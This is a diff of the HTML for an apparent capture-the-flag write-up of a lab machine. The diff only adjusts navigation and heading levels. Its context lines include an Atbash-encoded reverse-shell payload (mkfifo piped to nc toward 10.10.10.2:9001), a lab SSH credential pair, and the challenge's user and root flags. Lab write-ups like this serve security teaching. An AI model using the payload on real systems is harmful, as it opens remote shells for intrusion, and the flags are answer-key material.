@@ -199,9 +199,7 @@ stroke-linejoin="round" class="feather feather-home">
         <li><a href="#nmap">Nmap</a></li>
       </ul>
     </li>
-  </ul>
-
-  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
     <li><a href="#http-port-80">HTTP (Port 80)</a></li>
     <li><a href="#command-injection">Command Injection</a>
       <ul>
@@ -209,9 +207,7 @@ stroke-linejoin="round" class="feather feather-home">
         <li><a href="#atbash-encoded-payload">Atbash-Encoded Payload</a></li>
       </ul>
     </li>
-  </ul>
-
-  <ul>
+    <li><a href="#initial-access">Initial Access</a></li>
     <li><a href="#privilege-escalation">Privilege Escalation</a>
       <ul>
         <li><a href="#user-enumeration">User Enumeration</a></li>
@@ -225,6 +221,7 @@ stroke-linejoin="round" class="feather feather-home">
         <li><a href="#ssh">SSH</a></li>
       </ul>
     </li>
+    <li><a href="#flags">Flags</a></li>
   </ul>
 </nav>
     </details>
@@ -285,7 +282,7 @@ stroke-linejoin="round" class="feather feather-home">
 <li><strong>80</strong> - HTTP (nginx)</li>
 </ul>
 <hr>
-<h1 id="enumeration">Enumeration</h1>
+<h2 id="enumeration">Enumeration</h2>
 <h2 id="http-port-80">HTTP (Port 80)</h2>
 <p>Browsing to the web server reveals a simple page containing a text input field.</p>
 <p><img src="/images/hmv/translator/http.png" alt="HTTP Form"></p>
@@ -311,7 +308,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span></code></pre></div><h3 id="atbash-encoded-payload">Atbash-Encoded Payload</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>in /gnk/u;npurul /gnk/u;xzg /gnk/u|hs -r 2&gt;&amp;1|mx 10.10.10.2 <span style="color:#ae81ff">9001</span> &gt;/gnk/u
 </span></span></code></pre></div><hr>
-<h1 id="initial-access">Initial Access</h1>
+<h2 id="initial-access">Initial Access</h2>
 <p>After stabilizing the shell, I checked the current user&rsquo;s sudo permissions.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
 </span></span></code></pre></div><p>A password was required, so I continued enumerating the web directory.</p>
@@ -405,7 +402,7 @@ stroke-linejoin="round" class="feather feather-home">
 <h3 id="ssh">SSH</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>ocean : ayurv3d4
 </span></span></code></pre></div><hr>
-<h1 id="flags">Flags</h1>
+<h2 id="flags">Flags</h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>user flag : a6765hftgnhvugy473f
 </span></span><span style="display:flex;"><span>root flag : h87M5364V2343ubvgfy
 </span></span></code></pre></div>
